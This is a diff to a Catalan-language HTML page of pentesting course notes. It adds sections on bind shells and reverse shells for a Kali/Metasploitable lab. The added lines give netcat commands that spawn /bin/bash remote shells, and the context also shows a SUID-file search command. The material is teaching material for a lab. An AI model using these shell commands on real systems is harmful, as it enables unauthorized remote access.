@@ -794,8 +794,22 @@ find / -user root -perm -u=s 2>/dev/null         </code></pre>
       <hr><pre>        Reverse shell             versus             Bind shell</pre>
       <img src="imgs/revShell.png" alt="reverse shell"  width="40%"  >
       <img src="imgs/bindShell.png" alt="reverse shell"  width="40%"  >
+      <h3>Bind Shell</h3>
       <p>En una Bind Shell, la victima escolta (server) i l'atacant connecta.</p>
+      <p>Atacant (Kali) ---> Connecta ---> Víctima (port obert escoltant)</p>
+      <pre># En la VÍCTIMA (Metasploitable/Linux):
+nc -lvp 4444 -e /bin/bash
+
+# En l'ATACANT (Kali):
+nc 192.168.56.20 4444   #ip de la victima</pre>
+        <h3>Reverse Shell</h3>
       <p>En una Reverse shell, l'atacant escolta i la victima connecta (evitant els firewalls)</p>
+      <p>Víctima ---> Connecta ---> Atacant (escoltant)</p>
+      <pre># ATACANT (Kali) - Escolta primer:
+nc -nlvp 4444
+
+# VÍCTIMA (Metasploitable/Linux) - Es connecta a l'atacant:
+nc 192.168.56.10 4444 -e /bin/bash   # ip de l'atacant</pre>
 
       </section>         
         
